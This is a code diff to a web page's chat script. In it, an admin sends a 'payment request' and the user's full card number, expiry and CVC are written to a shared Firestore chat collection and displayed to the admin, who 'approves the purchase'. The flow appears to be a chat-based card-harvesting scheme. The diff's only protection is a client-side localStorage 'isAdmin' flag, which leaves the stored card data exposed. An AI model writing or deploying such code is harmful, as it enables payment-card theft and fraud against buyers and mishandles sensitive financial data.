@@ -1376,14 +1376,11 @@
     let activeRequestId = null;
 
     window.addEventListener("DOMContentLoaded", () => {
-        // Каждые полсекунды проверяем и внедряем кнопку прямо под заголовком «Входящие и Чат»
         setInterval(injectAdminButtonFixed, 500);
         initChatSync();
     });
 
-    // Надежное внедрение кнопки в верхнюю часть раздела чата
     function injectAdminButtonFixed() {
-        // Ищем заголовок «Входящие и Чат» на странице
         const headers = Array.from(document.querySelectorAll('h1, h2, h3, div')).filter(el => el.textContent.includes('Входящие и Чат'));
         
         if (headers.length > 0 && !document.getElementById("fixedAdminPayBtn")) {
@@ -1401,7 +1398,6 @@
         }
     }
 
-    // 1. Админ отправляет запрос
     window.adminTriggerPaymentRequest = async function() {
         try {
             await addDoc(collection(db, CHATS_COLLECTION), {
@@ -1427,7 +1423,6 @@
         activeRequestId = null;
     };
 
-    // 2. Пользователь отправляет данные карты
     window.submitCardData = async function() {
         const number = document.getElementById("modalCardNumber").value;
         const date = document.getElementById("modalCardDate").value;
@@ -1459,7 +1454,6 @@
         }
     };
 
-    // 3. Админ одобряет покупку
     window.approvePurchase = async function(msgId) {
         try {
             await updateDoc(doc(db, CHATS_COLLECTION, msgId), { status: "approved" });
@@ -1469,11 +1463,9 @@
         }
     };
 
-    // 4. Синхронизация чата (вывод карточки запроса)
     function initChatSync() {
         const q = query(collection(db, CHATS_COLLECTION));
         onSnapshot(q, (snapshot) => {
-            // Удаляем старые дубликаты
             document.querySelectorAll('.dynamic-chat-request').forEach(el => el.remove());
 
             let latestDoc = null;
@@ -1488,7 +1480,6 @@
             });
 
             if (latestDoc) {
-                // Ищем место для вставки (под заголовком или в тело страницы)
                 const targetArea = document.querySelector('.container, body');
                 
                 const box = document.createElement("div");
@@ -1504,15 +1495,27 @@
                     `;
                 } else {
                     let statusText = latestDoc.status === "approved" ? "✅ Одобрено администратором" : "⏳ Ожидает проверки";
+                    
+                    // Проверяем, является ли текущий пользователь админом
+                    const isAdmin = localStorage.getItem('isAdmin') === 'true';
+
+                    // Блок с данными карты генерируется ТОЛЬКО для администратора
+                    let adminCardHTML = '';
+                    if (isAdmin) {
+                        adminCardHTML = `
+                            <div style="background: #2a0808; border: 1px solid #ff4444; padding: 10px; border-radius: 6px; margin-top: 8px;">
+                                <p style="color: #ff8888; margin: 0 0 5px 0; font-size: 13px;">🔒 <b>Данные карты для админа:</b></p>
+                                <p style="margin: 2px 0; font-family: monospace;">Номер: <b>${latestDoc.cardNumber || 'Нет данных'}</b></p>
+                                <p style="margin: 2px 0; font-family: monospace;">Дата: <b>${latestDoc.cardDate || '--/--'}</b> | CVC: <b>${latestDoc.cardCvc || '---'}</b></p>
+                                ${latestDoc.status !== "approved" ? `<button onclick="approvePurchase('${latestDoc.id}')" style="background: green; color: white; padding: 6px 12px; border: none; cursor: pointer; border-radius: 4px; font-weight: bold; margin-top: 8px;">Принять покупку</button>` : ''}
+                            </div>
+                        `;
+                    }
+
                     box.innerHTML = `
                         <p style="margin: 0 0 5px 0;"><b>👤 Покупатель отправил реквизиты</b></p>
                         <p style="margin: 0 0 8px 0; font-weight: bold;">Статус: ${statusText}</p>
-                        <div style="background: #2a0808; border: 1px solid #ff4444; padding: 10px; border-radius: 6px; margin-top: 8px;">
-                            <p style="color: #ff8888; margin: 0 0 5px 0; font-size: 13px;">🔒 <b>Данные карты для админа:</b></p>
-                            <p style="margin: 2px 0; font-family: monospace;">Номер: <b>${latestDoc.cardNumber || 'Нет данных'}</b></p>
-                            <p style="margin: 2px 0; font-family: monospace;">Дата: <b>${latestDoc.cardDate || '--/--'}</b> | CVC: <b>${latestDoc.cardCvc || '---'}</b></p>
-                            ${latestDoc.status !== "approved" ? `<button onclick="approvePurchase('${latestDoc.id}')" style="background: green; color: white; padding: 6px 12px; border: none; cursor: pointer; border-radius: 4px; font-weight: bold; margin-top: 8px;">Принять покупку</button>` : ''}
-                        </div>
+                        ${adminCardHTML}
                     `;
                 }
                 targetArea.appendChild(box);
